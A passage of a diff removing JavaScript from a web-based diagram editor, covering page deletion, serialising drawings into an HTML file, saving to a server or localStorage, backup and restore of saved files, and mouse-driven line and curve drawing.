-       {
-           if (pagenum <= pagetbl.rows.length - 1 &&  pagetbl.rows.length > 1 )
-           str = "<br><input type=checkbox id=\"promptcheck\" " + (deletepage==1?'checked':'') + " onclick=\"ifchecked(this)\">" + textmsg[1661];
-       }
-       myprompt( (textmsg[1660] + str), null, "if(v)clearall2()", textmsg[1633]);
-
-   }
-   else
-   {
-       delall();
-       if (deletepage== 1)
-       {
-         var i = shapearr.length-1;
-         for (; i > pagenum; i--)
-         {
-           shapearr[i] = shapearr[i-1];
-           linearr[i]  = linearr[i-1];
-           curvearr[i]  = curvearr[i-1];
-           allies[i] = allies[i-1];
-           bgarr[i] = bgatt[i-1];
-         }
-
-       }
-
-       // if (cachedone(false))
-       if (tempsstr!=null)
-       {
-           copy(shapearr,pagenum,  tempsstr);
-           copy(linearr, pagenum,   templstr);
-           copy(curvearr, pagenum,   tempcstr);
-           copy(allies, pagenum,   tempastr);
-           tempbstr = bgarr[pagenum];
-           initial();
-       }
-       hassaved = false;
-   }
-}
-function ifchecked(td)
-{
-    deletepage = td.checked?1:0;
-}
-function undodel()
-{
-
-}
-function clearall2()
-{
-    clearall();
-    if (chatsessionnum > -1) return;
-    //$("clearbtn").text = "Undo";
-    if (deletepage== 1)
-    {
-        for (var i=pagenum; i < shapearr.length-1 && shapearr[i+1]!=null; i++)
-        {
-           shapearr[i] = shapearr[i+1];
-           linearr[i]  = linearr[i+1];
-           curvearr[i]  = curvearr[i+1];
-           allies[i]  = allies[i+1];
-           bgarr[i] = bgarr[i+1];
-        }
-        var NN = shapearr.length-1;
-        shapearr.splice(NN,1);
-        linearr.splice(NN,1);
-        curvearr.splice(NN,1);
-        allies.splice(NN,1);
-        bgarr.splice(NN,1);
-        pagetbl.deleteRow(NN);
-        if (pagenum>0 && shapearr[pagenum] == null)
-        {
-            $('tdpage').innerHTML = textmsg[1854].replace(/@/,''+ (pagenum));
-            pagenum--;
-        }
-      
-        initial();
-    }
-}
-function changethickall()
-{
-    var fs = Math.floor(getFontsize()/10);
-    for (var i=0; i < numLines; i++)
-    if (allLines[i] != null)
-    {
-       allLines[i].thick = fs;
-       allLines[i].redraw();
-    }
-    for (i=0; i < numCurves; i++)
-    if (allCurves[i] != null)
-    {
-       allCurves[i].thick = fs;
-       allCurves[i].redraw();
-    }
-}
-
-
-function makeintostring(xy)
-{
-
-    var map = new Array(numShapes);
-    var k = numShapes;
-    if (typeof(curvearr) == 'undefined')
-    {
-        curvearr = new Array();
-        for (var l=0; l <shapearr.length; l++ )
-            curvearr[l] = new Array();
-    }
-    if (typeof(linearr) == 'undefined')
-    {
-        linearr = new Array();
-        for (var l=0; l <shapearr.length; l++ )
-            linearr[l] = new Array();
-    }
-
-    if (typeof(allies) == 'undefined')
-    {
-        allies = new Array();
-        for (var l=0; l <shapearr.length; l++ )
-            allies[l] = new Array();
-    }
-    if (typeof(bgarr) == 'undefined')
-    {
-        bgarr = new Array(shapearr.length);
-
-    }
-
-    if (shapearr.length <= pagenum)
-    {
-
-        shapearr[pagenum] = new Array();
-         linearr[pagenum] = new Array();
-         curvearr[pagenum] = new Array();
-         allies[pagenum] = new Array();
-
-    }
-    var i=0;
-    for (; i < k; i++)
-    {
-        var j = i;
-        if (allShapes[i] == null)
-        {
-            while (k>=1 && allShapes[k-1]==null)
-            {
-                k--;
-            }
-            if (k <= i) break;
-            j = k-1;
-            map[j] = i;
-            k--;
-        }
-        else map[i] = i;
-        shapearr[pagenum][i] =  allShapes[j].toString().replace(/true$/,'false');
-        if (xy!=null)
-        {
-            xy[i] = [allShapes[j].x,allShapes[j].y];
-        }
-    }
-    for (; i < shapearr[pagenum].length; i++)
-        shapearr[pagenum][i] = null;
-    k = numLines;
-    for (i=0; i < k; i++)
-    {
-        j = i;
-        if (allLines[i] == null)
-        {
-           while (k>=1 && allLines[k-1]==null)
-           {
-                k--;
-           }
-            if (k <= i) break;
-           j = k -1;
-           k--;
-
-        }
-        linearr[pagenum][i] =   allLines[j].toString(map) ;
-
-    }
-    for (; i < linearr[pagenum].length; i++)
-        linearr[pagenum][i] = null;
-
-    k = numCurves;
-
-    for (i=0; i < k; i++)
-    {
-        j = i;
-        if (allCurves[i] == null)
-        {
-           while (k>=1 && allCurves[k-1]==null)
-           {
-                k--;
-           }
-            if (k <= i) break;
-           j = k -1;
-           k--;
-
-        }
-        curvearr[pagenum][i] =   allCurves[j].toString() ;
-
-    }
-    if (curvearr[pagenum]!=null)
-    {
-        for (; i < curvearr[pagenum].length; i++)
-        {
-            curvearr[pagenum][i] = null;
-        }
-    }
-}
-function useoriginalurl(x)
-{
-    var j=0, k=0; var s = '';
-    while ( (j = x.indexOf(originalurl,k)) >= 0)
-    {
-        if (j > k)
-            s += x.substring(k,j) ;
-        s += '" + originalurl + "';
-        k = j + originalurl.length;
-    }
-    return s + x.substring(k);
-}
-function arrstr(x)
-{
-    if (x==null || x.length==0) return '[]';
-    var str = '[';
-    for (var j=0; j < x.length; j++)
-        str += '[' + x[j][0] + "," + x[j][1] + '],';
-    return str.replace(/,$/,']');
-}
-function makefile()
-{
-    attachstr  = document.f.attach.value;
-    makeintostring();
-    if (passedencoding == null || passedencoding == '')
-    {
-        passedencoding = 'UTF-8';
-        var headsec = document.getElementsByTagName('head')[0];
-        var metas = headsec.getElementsByTagName('meta');
-        for (var j=0; j < metas.length; j++)
-            if (metas[j].content && metas[j].content.toLowerCase().indexOf('charset'))
-        {
-            passedencoding = metas[j].content.replace(/^text.html;[ ]*charset=(.*)$/i,"$1");
-            break;
-        }
-    }
-
-    var ltxscrpt  = $("ltxscrpt");
-    var s = "<!DOCTYPE html>\n<html>\n<head>\n<meta id=mainmeta http-equiv=\"Content-Type\" content=\"text/html;charset=" + passedencoding + "\" >\n"
-       + ltxscrpt.outerHTML.replace(/;executed=true/,'')
-       + "<style type=\"text/css\">.tlmmsty{border:0px black solid;font-style:normal;font-family:" + myfontname + ";vertical-align:top;text-align:center;padding:0px 0px 0px 0px}\n"
-       + ".tlmmline{width:100%}\n.tlmvline{height:100%}\n"
-       + ".tdbutton1{border:0px #bbb solid;font-style:normal;font-family:arial;vertical-align:middle;text-align:center;padding:0px 0px 0px 0px;}\n"
-       +".samebg{background-color:transparent;color:black;font-size:20px;font-family:" + myfontname + "}\n"
-       + "</style>\n\n"
-       +"<!--link rel=styleSheet type=css/text href=mystyle.css-->\n\n</head>\n";
-
-    var tx = null;
-    if (typeof(bgarr)!='undefined'&&bgarr.length>0)
-        tx = bgarr[0];
-    else
-        tx = getdocbg();
-    var xz = ''; var xt;
-    if (tx.indexOf('http') == 0 && tx.length>15)
-    var xx = ";background-image:url(" + tx +")";
-    else if (tx.indexOf(',') > 0)
-        xx = ";background-image:linear-gradient(to right," + tx +")";
-    else if ( (xt = tx.split(/ /)).length>1)
-    {
-        xx = ";backgroundImage:url();background-color:" + xt[1];
-        xz = 'shapebg' +  xt[0] ;
-    }
-    else if (!isNaN(tx))
-    {
-        xx = ";backgroundImage:url()";
-        xz = 'shapebg' + tx;
-    }
-    var yy = document.body.style.backgroundColor;
-
-    if (yy!=null)
-        yy  = ";background-color:" + yy;
-    else
-        yy = '';
-
-    s += "<body class=" + xz + "  style=\"margin:0px 5px 0px 5px" + xx + yy + "\">\n<scr" + "ipt  type=\"text/javascript\" >\n"
-    s += "/*1*/var orgnum="   + orgnum+";\n"
-    s += "/*1*/var originalurl='"   + originalurl +"';\n";
-    s += "/*1*/var umltoolstyles = document.createElement('link');umltoolstyles.id='styleb'+(orgnum%65536);umltoolstyles.rel = 'stylesheet';umltoolstyles.type = 'text/css';umltoolstyles.media = 'screen';document.getElementsByTagName('head')[0].appendChild(umltoolstyles);\n";
-    s += "/*1*/umltoolstyles.href =originalurl + '/styleb' + (orgnum%65536) + '.css';\n";
-    s += "/*1*/var cachedfontfamily='" + cachedfontfamily + "';\n";
-    s += "/*1*/var colors='"   +  hexcolor(colors[0]);
-    for (var j=1; j < colors.length; j++) s += "," + hexcolor(colors[j]);
-    s += "'.split(/,/);\n"
-    s += "/*1*/var bcolors='"   +  hexcolor(bcolors[0]);
-    for (j=1; j < bcolors.length; j++) s += "," +  hexcolor(bcolors[j]);
-    s += "'.split(/,/);\n"
-    s += "/*1*/var filename='"   + document.f.filedir.value + "';\n/*1*/var needtranslator = true;\n/*1*/var editable=true;\n/*1*/var tstmp="
-    +  ((new Date()).getTime()%10000000) + ";\n/*1*/var shapearr=[];\n/*1*/var linearr=[];\n/*1*/var curvearr=[];\n/*1*/var attachstr=\"" + attachstr + "\";\n/*1*/var shapetime=[];\n/*1*/var linetime=[];\n/*1*/var curvetime=[];\n/*1*/var pagetime=[];\n/*1*/var allies=[];\n/*1*/var bgarr=[];\n";
-    s += "/*1*/var kframes=[];\n/*1*/var kshapes = [];\n";
-    for (j=0; j < kshapes.length; j++) if (kshapes[j]!=null && kshapes[j]!='')
-    s += "/*1*/kshapes[" + j + "]=\"" + kshapes[j] + "\";\n";
-    for (var jj in kframes)
-    {
-        s += "/*1*/kframes['" + jj + "']={esn:"  +kframes[jj].esn + ",ets:" + arrstr(kframes[jj].ets) + ",etm:" + kframes[jj].etm + ",ssn:"  +kframes[jj].ssn + ",sts:" + arrstr(kframes[jj].sts) + ",stm:" + kframes[jj].stm + ",loop:" + kframes[jj].loop + ",lsn:"  +kframes[jj].lsn + ",lts:" + arrstr(kframes[jj].lts) + ",ltm:" + kframes[jj].ltm + "};\n";
-    }
-    for (var n=0; n < shapearr.length && shapearr[n]!=null; n++)
-    {
-        var sd = '';
-        for (var j=0; j < shapearr[n].length; j++)
-        {
-            if (shapearr[n][j] != null)
-            {
-                if (sd != '')  sd +=',\n';
-                sd += '"' + useoriginalurl(shapearr[n][j].replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\r/g, '').replace(/\n/g, '\\n')) + '"';
-            }
-        }
-
-        s +="\n/*1*/shapearr[" +  n +"] = [" + sd + "];\n/*1*/linearr[" +  n + "] = [";
-        sd = '';
-        for (j=0; j < linearr[n].length; j++)
-        {
-            if (linearr[n][j] != null)  {
-            if ( sd != '' ) sd +=',\n';
-            sd += '"' + linearr[n][j] + '"';}
-        }
-        s += sd + "];\n/*1*/curvearr[" +  n + "] = [";
-
-        sd = '';
-        if (curvearr[n]!=null)
-        for (j=0; j < curvearr[n].length; j++)
-        {
-            if (curvearr[n][j] != null)  {
-            if ( sd != '' ) sd +=',\n';
-            sd += '"' + curvearr[n][j] + '"';}
-        }
-        s += sd + "];";
-      //  s += "\n/*1*/attacharr[" +  n + "] = '" + ((attacharr[n]==null||attacharr[n]=='undefined')?'':attacharr[n]) + "';";
-        if (allies[n]!=null)
-        {  s += "\n/*1*/allies[" +  n + "] = [";
-        if (allies[n].length > 0)
-        {   s += "'" +  allies[n][0] +"'";
-           for (var j=1; j < allies[n].length; j++)
-           {
-            s += ",'" + allies[n][j] + "'";
-           }
-        }
-        s += "];";
-        }
-        s += "\n/*1*/bgarr[" +  n + "] = ";
-        if (bgarr[n]==null) bgarr[n]='';
-        s += "'" +  bgarr[n] +"';";
-
-    }
-    
-    s += "\n/*1*/var jsscripts = ['" + getlang() + ".js','cookie.js','checkHTML.js','attachment.js','curve.js?sn=30&dn=20','findrep.js','installtool.js','mousetrap.min.js','umltool.js'];\n";
-    s += "/*1*/for (var ii=0; ii < jsscripts.length; ii++)\n";
-    s += "/*1*/document.write('<scrip'+'t  type=\"text/javascript\" src=\"'   + originalurl + '/' + jsscripts[ii] + '\"></scrip' + 't>');\n";
-    s += "/*1*/</scrip"+ "t>\n</body>\n</html>";
-    return s;
-}
-function getlang()
-{
-    let lang = null;
-    if (typeof(jsscripts)!='undefined')
-        lang = jsscripts[0].replace(/\.js/,'');
-    else
-    {
-        var lang0 = document.location.toString();
-        let j = lang0.indexOf('lang=');
-        if (j > 0)
-        {
-            lang = lang0.substring(j+5).replace(/&.*/,'');
-        }
-        else
-            lang = 'en';
-    }
-    return lang;
-}
-function saveas()
-{
-    myprompt(textmsg[2],document.f.filedir.value.replace(/\\./, '1.'), "saveas1(v)");
-
-}
-function filexist(fn, len)
-{
-    if (len >= 0)
-    {
-        document.f.filedir.value = filename;
-        myprompt(fn + textmsg[3] + "<br>" + textmsg[2],document.f.filedir.value.replace(/\\./, '1.'), "saveas1(v)");
-
-    }
-    else
-    {
-        filename = document.f.filedir.value;
-        saveit();
-    }
-}
-
-function saveas1(v)
-{
-    if (folder !=null){
-    submitstring = "saveas1('" + v + "')";
-    filename = document.f.filedir.value;
-    document.f.target = iframename;
-    document.f.operation.value = 'exist';
-    formnewaction(document.f, originalurl + "/FileOperation");
-    document.f.filedir.value = v;
-    expiretime = activeidletime + (new Date()).getTime();
-    visual(document.f);
-    document.f.submit();
-    }
-    else
-    {
-        filename = v;
-        makefile();
-        localStorage[filename] = tojson(); 
-        let x = document.location.toString().replace(/fn=[^&]+/,'fn=' + filename);
-        document.location.href = x;
-    }
-}
-var submitstring = null;
-resumehalted = function(sid)
-{
-   sessionid = sid;
-   if (submitstring!=null && submitstring!='')
-   eval(submitstring);
-}
-
-function saveit()
-{
-   
-    submitstring = "saveit()";
-    expiretime = activeidletime + (new Date()).getTime();
-    hassaved = false;
-
-    if (opener!=null &&  (onmydomain(opener))  && opener.helpsave)
-    {
-        if ($("savearea") == null)
-            opener.helpsave(window, document.f.filedir.value,  (makefile()));
-        else
-            opener.helpsave(window, document.f.filedir.value,   ($("savearea").value));
-    }
-    else if (parent!=null && parent.helpsave)
-    {
-        if ($("savearea") == null)
-            parent.helpsave(window, document.f.filedir.value,   (makefile()));
-        else
-            parent.helpsave(window, document.f.filedir.value,   ($("savearea").value));
-    }
-    else if (folder !=null)
-    {
-        document.f.folder.value  =  folder;
-        document.f.destination.value = makefile();
-        document.f.target = "w" + tstmp;
-        document.f.operation.value = "save";
-        formnewaction(document.f,originalurl + "/FileOperation");
-        visual(document.f);
-        document.f.submit();
-    }
-    else
-    {
-        makefile();
-        localStorage[filename] = tojson(); 
-    }
-}
-function tojson()
-{
-    var obj = {
-    "orgnum":orgnum,
-    "originalurl":originalurl,
-    "umltoolstylesid":typeof(umltoolstyles)!='undefined' && umltoolstyles!=null? umltoolstyles.id:null,
-    "umltoolstyleshref":typeof(umltoolstyles)!='undefined' && umltoolstyles!=null?umltoolstyles.href:null,
-    "cachedfontfamily":cachedfontfamily,
-    "colors":colors,
-    "bcolors":bcolors,
-    "filename":filename,
-    "needtranslator":needtranslator,
-    "editable":editable,
-    "tstmp":tstmp,
-    "shapearr":shapearr,
-    "linearr":linearr,
-    "curvearr":curvearr,
-    "attachstr":attachstr,
-    "shapetime":shapetime,
-    "linetime":linetime,
-    "curvetime":curvetime,
-     "pagetime":pagetime,
-     "allies":allies,
-     "bgarr":bgarr,
-    "kframes":kframes,
-    "kshapes":kshapes
-    };
-    return JSON.stringify(obj);
-}
-function fromjson()
-{
-    
-}
-function sourcecodes()
-{
-    closeprompt();
-    myprompt("<textarea id=\"savearea\" rows=20 cols=60></textarea><br><center><a id=\"da\"  download=\"" + filename + "\" type='text/html'>Save File</a>  <input type=button style=\"background-color:#00BBBB;color:white;width:90px;border:1px #b0b0b0 outset;border-radius:3px\" value=\"Manage Cache\" onclick=\"managefiles()\" > <input type=button style=\"background-color:#00BBBB;color:white;width:90px;border:1px #b0b0b0 outset;border-radius:3px\" value=\"" + textmsg[118] + "\" onclick=\"restorefiles()\" ></center>",null,null,filename );
-    let csv = $("savearea").value = makefile().replace(/\n\/\*1\*\//g, '\n');
-    var data = new Blob([csv]);
-    var a = document.getElementById('da');
-    a.href = URL.createObjectURL(data);
-}
-function restorefiles(stage)
-{
-    if (stage == null)
-    {
-    closeprompt();
-    myprompt("Open a back-up file named <font color=red>showcase********.bak</font> in a notepad and copy the file contents to here<br><textarea id=\"savearea\" rows=20 cols=60></textarea><br><center><input type=button style=\"background-color:#00BBBB;color:white;width:90px;border:1px #b0b0b0 outset;border-radius:3px\" value=\"" + textmsg[118] + "\" onclick=\"restorefiles(1)\" ></center>",null,null,textmsg[118]);
-    //$("savearea").value = makefile().replace(/\n\/\*1\*\//g, '\n');
-    }
-    else
-    {
-       var xy = JSON.parse($("savearea").value);
-       for (let x in xy)
-       {
-           localStorage[x] = xy[x];
-       }
-       closeprompt();
-    }
-}
-function delivery()
-{
-     closeprompt();
-     var attr  = "";
-     var x = document.body.attributes;
-     for (var i=0; i < x.length; i++)
-     {
-         if (x[i].value != null && x[i].value != 'null' && x[i].value != '')
-         {
-             attr  += x[i].name + "=\"" + x[i].value +"\" ";
-
-         }
-     }
-     var s = "<!DOCTYPE html><html><head>" + document.getElementsByTagName("head")[0].innerHTML + "</head><body "
-    + attr  + ">";
-
-     for (var j =0; j < numShapes; j++)
-     {
-         var w = allShapes[j].base;
-
-         attr  = "";
-         x = w.attributes;
-         for (  i=0; i < x.length; i++)
-         {
-           if (x[i].value != null && x[i].value != 'null' && x[i].value != '' && x[i].name.indexOf("on") != 0)
-           {
-             attr  += x[i].name + "=\"" + x[i].value +"\" ";
-           }
-         }
-
-         s += "<DIV " + attr + ">" + w.innerHTML + "</DIV>\n\n\n";
-
-     }
-    myprompt("<textarea id=\"savearea\" rows=20 cols=60></textarea><br><center><input type=button style=\"background-color:#00BBBB;color:white;width:90px;border:1px #b0b0b0 outset;border-radius:3px\" value=\"Editing Version\" onclick=\"sourcecodes()\" ></center>",null,null,textmsg[532]);
-    $("savearea").value = s + "</body></html>";
-
-}
-function managefiles(ms)
-{
-    if (ms == null) ms = '';
-    else 
-        ms = '<font color=red>'+ ms +'</font>';
-    var v =ms + '<table align=center id=savearea style=border-collapse:collapse;border-color:lightyellow border=1><tr bgcolor=lightgray><td>File Name</td><td><input type=checkbox onclick=selectallfile(this)></td></tr>';
-    for (let fn in localStorage)
-    {
-        if (fn.indexOf('.html')>0)
-        {
-            v += '<tr><td>' + fn + '</td><td><input type=checkbox></td></tr>';
-        }
-    }
-    v += '</table>';
-    myprompt(v + "<br><center><input type=button style=\"background-color:#00BBBB;color:white;width:90px;border:1px #b0b0b0 outset;border-radius:3px\" value=\"Back Up\" onclick=\"backupFiles()\" > <input type=button style=\"background-color:#00BBBB;color:white;width:90px;border:1px #b0b0b0 outset;border-radius:3px\" value=\"Delete\" onclick=\"deleteSFiles()\" ></center>",null,null,"Files");
-    //$("savearea").value = s + "</body></html>";   
-}
-function selectallfile(c)
-{
-    if (c.checked)
-    {
-       var tbl = $("savearea");
-       for (let i =1; i < tbl.rows.length; i++)
-       {
-           tbl.rows[i].cells[1].childNodes[0].checked = true;
-
-       }
-    }
-    else
-    {
-       var tbl = $("savearea");
-       for (let i =1; i < tbl.rows.length; i++)
-       {
-           tbl.rows[i].cells[1].childNodes[0].checked = false;
-       }
-    }
-}
-function deleteSFiles()
-{
-   var tbl = $("savearea");
-   var c = 0;
-   for (let i =1; i < tbl.rows.length; i++)
-   {
-       if (tbl.rows[i].cells[1].childNodes[0].checked)
-       {
-           delete  localStorage[tbl.rows[i].cells[1].innerHTML];
-           c++;
-       }
-   }
-   let ms = '';
-   if (c == 0) ms = 'No file selected';
-   managefiles(ms);
-}
-function backupFiles()
-{
-   var obj = {};
-   var tbl = $("savearea");
-   var nf = 0;
-   for (let i =1; i < tbl.rows.length; i++)
-   {
-       if (tbl.rows[i].cells[1].childNodes[0].checked)
-       {
-           nf++; let fn = tbl.rows[i].cells[0].innerHTML;
-           obj[fn] = localStorage[fn];
-       }
-   }
-   if (nf == 0)
-   {
-      managefiles('No file selected');
-      return;
-   }
-   var s = JSON.stringify(obj); 
-   var d  = new Date(); 
-let ye = new Intl.DateTimeFormat('en', { year: 'numeric' }).format(d);
-let mo = new Intl.DateTimeFormat('en', { month: '2-digit' }).format(d);
-let da = new Intl.DateTimeFormat('en', { day: '2-digit' }).format(d);
-    
-   var fn = ye + mo + da;
-   myprompt(nf + " files. Don't edit the text. Click 'Save File' instead <br><textarea id=\"savearea\" rows=20 cols=60></textarea><br><center><a id=\"da\"  download=\"showcase"+fn+".bak\" type='text/json'>Save File</a></center>",null,null,textmsg[532]);
-   let csv = $("savearea").value = s ;
-   var data = new Blob([csv]);
-   var a = document.getElementById('da');
-   a.href = URL.createObjectURL(data);
-}
-function toclip(fn)
-{
-   var copyText = document.getElementById("savearea");
-  copyText.select();
-  copyText.setSelectionRange(0, 99999); /* For mobile devices */
-  document.execCommand("copy");
-  myprompt("File contents have been copied to clipboard. You can paste them to a notepad and save them as a file named <font color=red>" + fn + "</font>");
-}
-function removescript(ss)
-{
-    var i = 0, j = -9;
-    var a = '';
-    var s = ss.toLowerCase();
-    while ( (i= s.indexOf("<scr" + "ipt ", j+9)) > 0 )
-    {
-        a += ss.substring(j+9, i);
-        j = s.indexOf("</scr" + "ipt>", i+8);
-    }
-    a += ss.substring(j+9);
-    return a;
-}
-function renull(fn,len,furl,ltime)
-{
-    if (activesave)
-    {
-    filename = fn;
-    myprompt(textmsg[1655]);
-    promptwin.style.left = '10px';
-    promptwin.style.top = '1px';
-    setTimeout('closeprompt()',1500);
-
-    }
-    hassaved = true;
-    activesave = false;
-}
-function addedItem(fn, url, len, tm)
-{
-    ResizeUploaded.uploaded("web/" + url, fn+'@'+tm);
-    return;
-    closeprompt();
-    var num = beingloadnum;
-    var s = "<img alt=\"" + fn + "\" src=\"" + originalurl + "/FileOperation?did=" + url +"\" />";
-    var b = $("t" + num);
-    var t = $("e" + num);
-    allShapes[num].words = t.value + s;
-    document.body.removeChild(b);
-    done(num);
-    document.onmousemove = onmouseover0;
-}
-function syn(act,x,y)
-{
-   if (act.indexOf('web') == 0)
-   {
-       var fn = x.replace(/@.*/,'');
-       document.title = fn;
-       var len = x.replace(/[^@]+@/,'');
-       var url = act.substring(4);
-       ResizeUploaded.uploaded(act,x);
-       addedItem(fn, url, len);
-   }
-   else if (act == 'del')
-   {
-       if (x.replace(/[0-9|a-z]/ig,'').replace(/[\-|_|\.|\$]/g,'')=='')
-          ResizeUploaded.refreshatt();
-   }
-   else if (isNaN(act))
-   {
-       document.f.filedir.value = filename;
-       document.title = filename;
-   }
-   else
-   {
-
-       if (whichact=='sql')
-       {
-       if (parseInt(act) > 0)
-       {
-          //var nam = open("tables.jsp?tname="+tnamebeing);
-           if ( typeof(parent.frames[0])!='undefined')
-           {
-               parent.frames[0].document.location.href =  parent.frames[0].document.location.toString();
-           }
-           myprompt(textmsg[1656]);
-
-       }
-       }
-   }
-
-}
-
-function winclick()
-{
-   var adot = document.getElementById("drawdonebtn");
-   if (adot != null) 
-   {
-       var xy = findPositionnoScrolling(adot);
-       if (myHinty <= xy[1] + adot.offsetHeight && myHinty >= xy[1]
-               && myHintx <= xy[0] + adot.offsetWidth && myHintx >= xy[0])
-       return;
-   }
-   if (myHinty < 30 ) return;
-   if (insideobj()) return;
-   var arr = null;
-  
-   if (drawstate== 1)
-   {
-        drawpointslength = 1;
-        drawpoints = [[myHintx,myHinty]];
-        drawstate = 2;
-        var k = Math.floor(getFontsize()/10);
-        new Curve(drawlinenumber,'curve', k, null, 0,2,0, drawpoints );
-   }
-   else if (drawstate== 2)
-   {
-        linetype = '';
-        drawstate = 0;
-        if ( chatsessionnum > -1 )
-        {
-             parent.sendObject(chatsessionnum, drawlinenumber + " c" +  allCurves[drawlinenumber].toString());
-        }
-        drawlinenumber = null;
-
-   }
-   else if (drawstate== 3)
-   {
-        drawpointslength = 1;
-        drawpoints = [[myHintx,myHinty]];
-        drawstate = 4;
-        var adot = document.createElement("span");
-        adot.id = "drawdonebtn"  ;
-        adot.style.cssText = "position:absolute;width:50px;left:" +  (myHintx+3)
-        +"px;top:" + (myHinty + 3) +"px;border:1px #909090 solid;background-color:orange;text-align:center";
-        adot.innerHTML = "End";
-        document.body.appendChild(adot);
-        Drag.init(adot);
-        adot.onmouseover = function()
-        {
-           this.style.left = (myHintx - 20 ) + 'px';
-           this.style.top =  (myHinty - 15 ) + 'px';
-        }
-        adot.onclick = function()
-        {
-           drawdone(this);
-        }
-        new Curve(drawlinenumber,'mline', Math.floor(getFontsize()/10), null,0,2,0, drawpoints);
-   }
-   else if (drawstate == -1)
-   {
-       drawstate = 3;
-   }
-   else if (drawstate >= 4)
-   {
-        drawpoints[drawpointslength++] = [myHintx,myHinty];
-        allCurves[drawlinenumber].draw(drawpointslength-2);
-        drawstate++;
-        adot = $("drawdonebtn");
-        adot.style.left = (myHintx+3);
-        adot.style.top = (myHinty+3);
-   }
-   
-   else  if (state == 1)
-   {
-        savestart = -1;
-        savestartx = myHintx;
-        savestarty = myHinty;
-        state = 2;
-        adot = document.createElement("div");
-        adot.id = "q-1"  ;
-        adot.style.cssText = "position:absolute;width:6px;height:6px;left:" +  (myHintx-3)
-        +"px;top:" + (myHinty - 3) +"px;border:1px #909090 solid;background-color:yellow";
-        adot.innerHTML = fillblank;
-        document.body.appendChild(adot);
-   }
-   else if (state== 2)
-   {
-        // Math.floor(getFontsize()/10);
-        var l = new Line(drawlinenumber,linetype,savestart,savestartx,savestarty, -1, myHintx, myHinty, cachedlinethick, seldirect,0, 2,cachedlinecolor, 0);
-
-        if (numsselected==null)
-        {
-            numsselected = [l.num]
-        }
-        else
-            numsselected[numsselected.length] = l.num;
-        drawlinenumber = null;
-         if (savestart == -1)
-         {
-            var x = $("q-1" );
-            if (x!=null)
-                document.body.removeChild(x);
-         }
-         else
-         {
-            var x = $("q" + (savestart));
-            if (x!=null)
-               allShapes[savestart].base.removeChild(x);
-         }
-
-        state = 1;
-        enabletd('tdline,tdcord');
-   }
-   else if ( ( arr = closelineend()) !=null)
-   {
-       var dv = document.createElement("div");
-       dv.id = "f" + arr[2] + "_" + arr[3];
-       dv.style.cssText = "position:absolute;z-index:10;width:6px;height:6px;background-color:yellow;border:1px #909090 solid;left:" + (arr[0]-3) +"px;top:" +
-           (arr[1]-3) + "px;";
-       document.body.appendChild(dv);
-       Drag.init(dv);
-       dv.onDragEnd = function(x,y)
-       {
-          var xs = this.id.substring(1).split(/_/);
-          var i = parseInt(xs[0]);
-          if (xs[1]== '0')
-          {
-              allLines[i].sx = x + 3;
-              allLines[i].sy = y + 3;
-          }
-          else if (xs[1]== '1')
-          {
-              allLines[i].ex = x + 3;
-              allLines[i].ey = y + 3;
-          }
-          allLines[i].redraw();
-          document.body.removeChild(this);
-       }
-   }
-   else if (dobackground && $("m0_0")==null)
-   {
-
-        var pg = $("tdbg");
-        if (pg!=null)
-        {
-            var xy = [0, 50];
-            if(typeof(findPositionnoScrolling)!= 'undefined')
-               xy = findPositionnoScrolling(pg);
-            if (! (myHintx < xy[0] + 100 && myHintx > xy[0] && myHinty < xy[1] + pg.offsetHeight+5 && myHinty > xy[1]))
-            mdia(0,0);
-        }
-        else
-            mdia(0,0);
-   }
-
-    document.onmousemove = onmouseover0;
-}
-function closelineend()
-{
-    for (var i=0; i< numLines; i++)
-    {
-        if (allLines[i] == null) continue;
-        if (allLines[i].startnum== -1 && (myHintx - allLines[i].sx)*(myHintx - allLines[i].sx) + (myHinty - allLines[i].sy)*(myHinty - allLines[i].sy) < 25 )
-            return [allLines[i].sx,allLines[i].sy,i,0];
-        else if( allLines[i].endnum== -1 && (myHintx - allLines[i].ex)*(myHintx - allLines[i].ex) + (myHinty - allLines[i].ey)*(myHinty - allLines[i].ey) < 25)
-            return [allLines[i].ex,allLines[i].ey,i,1];
-
-    }
-    return null;
-
-}
-function divclick(dv)
-{
-   if (dv.id.charAt(0) == 'b') return;
-
-   var num =  parseInt(dv.id.substring(1));
-   if (''+ num== 'NaN')
-   {
-       myprompt(dv.id + ' is num');
-
-       return;
-   }
-
-   if (state== 0)
-   {
-       var tt = dv.innerHTML.replace(/^\s+/g,'').replace(/\s+$/,'').replace(/<[\/]?nobr>/gi,'');
-
-       mdia(num, 1);
-   }
-   else
-   {
-       var bv = $("b" + dv.id.substring(1));
-       begindraw(bv);
-   }
-   document.onmousemove = onmouseover0;
-}
-
-function islatex(s)
-{
-   return (s.indexOf("$") >= 0  || s.indexOf("\\begin{") >=0 );
-}
-function ishtml(s)
-{
-   s = s.toLowerCase();
-   var k = 0;
-   var r = RegExp(/<[a-z|0-9]+/);
-   while (k < s.length-4)
-   {
-       var m = r.exec(s.substring(k));
-       if (m == null) return false;
-       var z = m.toString();
-
-       k += m.index + z.length;
-       var uu = z.substring(1);
-       if ( (s.indexOf("</" + uu + ">",k) > 0 || s.indexOf("/>",k) > 0 ) && uu!='oln'&& uu!='ola' && uu!='ulb')
-           return true;
-   }
-   return false;
-}
-var formatstr0old = formatstr0;
-formatstr0 = function(v, fmt)
-{
-   // var bb = ishtml(v);
-    v =  formatnolx(v, colorbeing, fmt );
-    return hw.merge(v);
-}
- 
-var shapenamebeing = null;
-var colorbeing = 'red';
-function  tohtml1(v,urlas,cl, shapename)
-{
-
-}
-function tohtml(v,urlas,cl, shapename)
-{
-    
-    colorbeing = cl;
-    shapenamebeing = shapename;
-
-    var ttype = 0;
-    if (urlas.indexOf('HTML')>=0) ttype = 1;
-    else if (urlas.indexOf('LaText')>=0) ttype = 2;
-    var s = formatstr(v, ttype).replace(/#aaaaaa/,cl);
-
-    if (s.indexOf('<nobr>http')==0) s = s.replace(/^<nobr>/,'').replace(/<.nobr>$/,'');
-    s = mergelink(s,urlas);
-
-    return s;
-}
-function makemultmedia(link,urla)
-{
-    var xs = urla.split(/_/);
-    if (xs[1] == null || xs[1]=='') xs[1] = '';
-    if ( (xs[0] == '2' || xs[0] == '3') && xs[1] == '')
-    {
-        xs[1] = '500';
-    }
-    if (xs[0] == '1')
-    {
-        if (ismakingtab!=1)
-        {
-            link = originalurl + "/image/pic.png";
-            xs[1] = Math.round(ismakingtab*parseFloat(xs[1]));
-            if (xs[1] != '' && !isNaN(xs[1]) && parseInt(xs[1])>1)
